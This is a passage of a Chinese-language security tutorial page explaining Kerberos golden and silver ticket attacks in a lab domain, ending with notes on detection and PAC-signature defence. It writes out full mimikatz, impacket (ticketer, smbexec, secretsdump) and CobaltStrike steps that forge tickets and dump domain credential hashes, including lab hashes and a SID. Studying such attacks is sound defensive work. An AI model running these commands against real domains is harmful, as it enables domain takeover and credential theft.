+<p>如图所示，当主机不在域内时，配置其 DNS 服务器为域控 10.211.55.4。</p>
+<p><img alt="截图" src="9aa81357a1367490e0769ea2a50fb091.png" /></p>
+<p>首先执行如下命令可以看到本机并没有权限导出域内任意用户哈希。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>mimikatz.exe &quot;lsadump::dcsync /domain:xie.com /user:krbtgt /csv&quot; &quot;exit&quot;
+</code></pre></div>
+<p><img alt="截图" src="a1d6cec5a3fd059f9cfc477735cfa643.png" /></p>
+<p>然后执行如下命令生成黄金票据并导入内存中，就拥有导出任意用户哈希的权限了。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>mimikatz.exe
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>#生成并导入黄金票据到当前内存中
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>kerberos::golden /user:administrator /domain:xie.com /sid:S-1-5-21-1313979556-3624129433-4055459191 /krbtgt:badf5dbde4d4cbbd1135cc26d8200238 /ptt
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>#验证是否成功，导出指定用户哈希
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>lsadump::dcsync /domain:xie.com /user:krbtgt /csv
+</code></pre></div>
+<p>如图所示，通过黄金票据攻击之后，即有权限导出域内任意用户哈希了！</p>
+<p><img alt="截图" src="fdf752deda082758e42ebf4f95ede276.png" /></p>
+<h3 id="3-cobaltstrike">3.使用 CobaltStrike 进行攻击<a class="headerlink" href="#3-cobaltstrike" title="Permanent link">&para;</a></h3>
+<p>当使用 CobaltStrike 进行攻击时，上线的机器可以是域中的普通机器，也可以不是域中的机器。当上线的机器不在域中时，需要将该机器的 DNS 服务器设置为域控。命令行设置 DNS 服务器命令如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>netsh interface ip set dns &quot;以太网&quot; static 10.211.55.4
+</code></pre></div>
+<p>如图所示，通过 CobaltStrike 设置当前主机的 DNS 为 10.211.55.4.</p>
+<p><img alt="截图" src="3f514f7da01510ee82a17ebee55a8b3e.png" /></p>
+<p>如图所示，然后查询即可看到 DNS 服务器此时已经设置为 10.211.55.4 了。</p>
+<p><img alt="截图" src="d62ce6e1c561d492e5189b4fbff90757.png" /></p>
+<p>然后如下操作，选中目标 session，然后右键执行——&gt;黄金票据</p>
+<p><img alt="截图" src="e32e2427cfb566469f3532d8896f1bf0.png" /></p>
+<p>如图所示，输入相应的信息后，点击 Build。</p>
+<p><img alt="截图" src="6419591e16f3958e89cf779bab7d9b93.png" /></p>
+<p>如图所示，可以看到黄金票据生成并导入内存中了。</p>
+<p><img alt="截图" src="5ea002c686022e958f876213fd0867a7.png" /></p>
+<p>然后就可以执行高权限操作了。如图所示，导出域内任意用户哈希。</p>
+<p><img alt="截图" src="39b1c6f2b594a3d2a66ba24807894eb5.png" /></p>
+<h2 id="silver-ticket">白银票据(Silver Ticket)攻击<a class="headerlink" href="#silver-ticket" title="Permanent link">&para;</a></h2>
+<p>在 Kerberos 认证过程的 TGS-REP 阶段，在验证了客户端发来的 TGT 认购权证的真实性和会话安全性后，KDC 的 TGS 票据授予服务将返回指定服务的 ST服务票据。ST 服务票据中加密部分 <code>authorization-data</code> 是使用服务密钥加密的，而 <code>authorization-data</code> 中存放着代表用户身份的 PAC，并且在这个阶段 PAC 的<code>PAC_SERVER_CHECKSUM</code> 签名的密钥也是服务密钥(但是该阶段 PAC 的<code>PAC_PRIVSVR_CHECKSUM</code> 签名的密钥是 krbtgt 密钥，此时客户端并不能伪造<code>PAC_PRIVSVR_CHECKSUM</code> 签名)。如图所示，是 TGS-REQ&amp;TGS-REP 的简要流程：</p>
+<p><img alt="截图" src="691c5e4258c1351e1080502a2d5fbf12.png" /></p>
+<p>因此，只要我们能拥有指定服务的密钥，就能够伪造高权限的 PAC，然后将其封装在 ST 服务票据中，并对其进行 <code>PAC_SERVER_CHECKSUM</code> 签名和加密。客户端再拿着这个 ST 服务票据以高权限访问指定服务！这里需要说明的是，由于<code>PAC_PRIVSVR_CHECKSUM</code> 签名的验证是可选的，并且默认不开启。因此即使攻击者无法伪造 <code>PAC_PRIVSVR_CHECKSUM</code> 签名，也能利用该 ST 服务票据以高权限进行正常请求！这个攻击过程被称为白银票据(Silver Ticket)传递攻击。</p>
+<p>要创建白银票据，我们需要知道以下信息：</p>
+<ul>
+<li>目标服务的密钥</li>
+<li>域的 SID 值</li>
+<li>域名</li>
+<li>要伪造的域用户，一般填写高权限帐户，如域管理员</li>
+</ul>
+<p>以下我们进行白银票据攻击使用的服务是域控 AD01 的服务，可以是<code>LDAP/CIFS/WinRM</code> 等服务。因此这里的密钥就是域控<code>AD01$</code>机器账号的密钥了。当请求的是指定服务如 LDAP 服务时，拥有的权限也只能是指定服务的权限。</p>
+<p>通过在域控上查询我们得到如下信息：</p>
+<ul>
+<li>服务哈希：d5d05db9b06988c17f903ef4847d9367</li>
+<li>域 sid：S-1-5-21-1313979556-3624129433-4055459191 </li>
+<li>域名：xie.com</li>
+<li>域管理员：administrator</li>
+</ul>
+<p>如下，使用 mimikatz 获得相关信息:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>mimikatz.exe &quot;lsadump::dcsync /domain:xie.com /user:AD01$ /csv&quot; &quot;exit&quot; &gt; 1.txt
+</code></pre></div>
+<p>如图所示，通过 mimikatz 执行相关命令查询到机器用户 <code>AD01$</code>的 NTLM 哈希值。以及通过 whoami /all 命令查询出域的 SID 值。</p>
+<p><img alt="截图" src="8106965ac713bf33a5e3af84894a0132.png" /></p>
+<p>现在我们需要利用这些信息来进行白银票据传递攻击了。能进行白银票据传递攻击的工具有很多，这里只介绍使用 impacket、mimikatz 和 CobaltStrike 来进行白银票据传递攻击。</p>
+<p>实验环境如下：</p>
+<ul>
+<li>域控系统版本：Windows Server 2012R2</li>
+<li>域控主机名：AD01 </li>
+<li>域控 ip：10.211.55.4</li>
+</ul>
+<h3 id="1-impacket_1">1.使用 impacket 进行攻击<a class="headerlink" href="#1-impacket_1" title="Permanent link">&para;</a></h3>
+<p>我们可以使用 impacket 下的 ticketer.py 脚本来离线生成白银票据，然后将票据导入内存中，即可使用 secretsdump.py、smbexec.py 等脚本进行后利用。命令如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>#生成白银票据
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>python3 ticketer.py -domain-sid S-1-5-21-1313979556-3624129433-4055459191 -nthash d5d05db9b06988c17f903ef4847d9367 -spn cifs/AD01.xie.com -domain xie.com administrator
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>#导入票据
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>export KRB5CCNAME=administrator.ccache
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>#访问域控 AD01
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>python3 smbexec.py -no-pass -k administrator@AD01.xie.com -dc-ip 10.211.55.4
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>#导出 administrator 用户的哈希
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>python3 secretsdump.py -k -no-pass administrator@AD01.xie.com -dc-ip 10.211.55. 4 -just-dc-user administrator
+</code></pre></div>
+<p>如图所示，对域控 AD01 进行基于 cifs 服务的白银票据攻击，攻击完成后，获得域控的最高权限：</p>
+<p><img alt="截图" src="64dd6c01bbb5fa38ead19da8868d9ad8.png" /></p>
+<p>这里由于是白银票据，因此只能访问指定服务，并不能访问其他服务。如下，当尝试访问其他服务时，报错！</p>
+<p>注：这里需要注意的是，需要先在本地 hosts 文件里面添加目标域控 AD01 对应的 ip。如果要访问其他主机，也需要在 hosts 文件里添加其他主机对应的 ip，如图所示是 hosts 文件：</p>
+<p><img alt="截图" src="5e24fc06bc51df5d14527280d25ae17b.png" /></p>
+<h3 id="2-mimikatz_1">2.使用 mimikatz 进行攻击<a class="headerlink" href="#2-mimikatz_1" title="Permanent link">&para;</a></h3>
+<p>使用 mimikatz 进行攻击的话，攻击机可以是域中的普通机器，也可以不是域中的机器。当攻击机不在域中时，需要将 DNS 服务器设置为域控。</p>
+<p>如图所示，当主机不在域内时，配置其 DNS 服务器为域控 10.211.55.4。</p>
+<p><img alt="截图" src="3d05274d681ba084ea2677546520970f.png" /></p>
+<p>首先执行如下命令可以看到本机并没有权限导出域内任意用户哈希。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>mimikatz.exe &quot;lsadump::dcsync /domain:xie.com /user:krbtgt /csv&quot; &quot;exit&quot;
+</code></pre></div>
+<p><img alt="截图" src="f9ecb09ccac86eec0b666dd61491377d.png" /></p>
+<p>然后执行如下命令生成白银票据并导入内存中，就拥有导出任意用户哈希的权限了。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>mimikatz.exe
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>#生成并导入黄金票据到当前内存中
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>kerberos::golden /domain:xie.com /sid:S-1-5-21-1313979556-3624129433-4055459191 /target:AD01.xie.com /service:ldap /rc4:d5d05db9b06988c17f903ef4847d9367 /user:administrator /ptt
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>#验证是否成功，导出指定用户哈希
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>lsadump::dcsync /domain:xie.com /user:krbtgt /csv
+</code></pre></div>
+<p>如图所示，通过对域控的 ldap 服务进行白银票据攻击之后，即有权限导出域内任意用户哈希了！</p>
+<p><img alt="截图" src="5c3c96f01a97f6c9af740bc7f0689b26.png" /></p>
+<h3 id="3-cobaltstrike_1">3.使用 CobaltStrike 进行攻击<a class="headerlink" href="#3-cobaltstrike_1" title="Permanent link">&para;</a></h3>
+<p>当使用 CobaltStrike 进行攻击时，上线的机器可以是域中的普通机器，也可以不是域中的机器。当上线的机器不在域中时，需要将该机器的 DNS 服务器设置为域控。命令行设置 DNS 服务器命令如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>netsh interface ip set dns &quot;以太网&quot; static 10.211.55.4
+</code></pre></div>
+<p>如图所示，通过 CobaltStrike 设置当前主机的 DNS 为 10.211.55.4。</p>
+<p><img alt="截图" src="05058665dd29a45632d69fa95ba02ba1.png" /></p>
+<p>如图所示，查询即可看到 DNS 服务器此时已经设置为 10.211.55.4 了。</p>
+<p><img alt="截图" src="ecad45380b69e7573e313c2c25de72c8.png" /></p>
+<p>由于 CobaltStrike 默认自带没有白银票据的功能，因此这里使用插件进行白银票据攻击。</p>
+<p><img alt="截图" src="8b5242d9ef1ed79d8722a9ea94596a9f.png" /></p>
+<p>如图所示，输入相应的信息后，点击 Build。</p>
+<p><img alt="截图" src="1c62efb009f842a73836788e163e2ce1.png" /></p>
+<p>如图所示，可以看到白银票据生成并导入内存中了。</p>
+<p><img alt="截图" src="09d2b3c9615cc5dda5258e7a58579616.png" /></p>
+<p>然后就可以执行高权限操作了。如图所示，导出域内任意用户哈希。</p>
+<p><img alt="截图" src="947125350703694d368d8857be1d5213.png" /></p>
+<h2 id="_1">黄金票据和白银票据的联系和区别<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="1">1.联系<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<ul>
+<li>两者都是基于 Kerberos 认证的攻击方式</li>
+<li>两者都属于票据传递攻击</li>
+<li>两者都常被用来做后渗透权限维持</li>
+</ul>
+<h3 id="2">2.区别<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
+<h4 id="1_1">(1) 访问权限的不同<a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h4>
+<ul>
+<li>黄金票据：通过伪造高权限的<strong> TGT</strong> 认购权证，可以以高权限访问<strong>任何服务</strong>。</li>
+<li>白银票据：通过伪造高权限的<strong> ST</strong> 服务票据，只可以以高权限访问<strong>指定服务</strong>。</li>
+</ul>
+<h4 id="2_1">(2) 加密密钥的不同<a class="headerlink" href="#2_1" title="Permanent link">&para;</a></h4>
+<ul>
+<li>黄金票据：由于 TGT 认购权证是通过 <strong>krbtgt</strong> 密钥加密的，因此黄金票据利用需要知道 krbtgt 的密钥。</li>
+<li>白银票据：由于 ST 服务票据是通过<strong>服务</strong>密钥加密的，因此白银票据利用需要知道指定服务的密钥。</li>
+</ul>
+<h4 id="3">(3) 日志的不同<a class="headerlink" href="#3" title="Permanent link">&para;</a></h4>
+<ul>
+<li>黄金票据：黄金票据因为只伪造了 TGT 认购权证，因此还需要跟KDC 进行 TGS 认证通信以获得 ST 服务票据，因此<strong>会在 KDC 上留下日志</strong>。</li>
+<li>白银票据：白银票据通过伪造 ST 服务票据，可以不跟 KDC 进行通信，直接访问指定服务。因此<strong>不会在 KDC 上留下日志，只会在目标服务器上留下日志</strong>。</li>
+</ul>
+<h2 id="_2">票据传递攻击防御<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="1_2">1.黄金票据攻击防御<a class="headerlink" href="#1_2" title="Permanent link">&para;</a></h3>
+<p>对于黄金票据攻击来说，由于 TGT 认购权证是在本地离线生成的。因此并没有和 KDC 之间发送 AS-REQ&amp;AS-REP 数据包。所以可以通过这一点，检测Kerberos 认证流程中缺少 AS-REQ&amp;AS-REP 数据包，但最后成功访问服务的请求过程，这种过程可以被判定为是黄金票据攻击。</p>
+<h3 id="2_2">2.白银票据攻击防御<a class="headerlink" href="#2_2" title="Permanent link">&para;</a></h3>
+<p>之前我们在 Kerberos 篇中提到了 PAC 有两个签名PAC_SERVER_CHECKSUM 和 PAC_PRIVSVR_CHECKSUM。其中PAC_SERVER_CHECKSUM 是由服务密钥签名的，PAC_PRIVSVR_CHECKSUM是由 krbtgt 密钥签名的。而对于攻击者来说，进行白银票据攻击时只获得了服务密钥，并没有 krbtgt 密钥，因此并不能伪造 PAC_PRIVSVR_CHECKSUM 签名。但是，在默认情况下，PAC_PRIVSVR_CHECKSUM 签名的验证是可选的，并且默认不开启。这也是白银票据攻击能成功的前提。</p>
+<p>因此要针对白银票据攻击进行防御，最好的办法就是开启目标服务主机的KDC 验证 PAC 签名</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 hypnotic
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../../../javascripts/extra.js"></script>
+      
+        <script src="../../../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
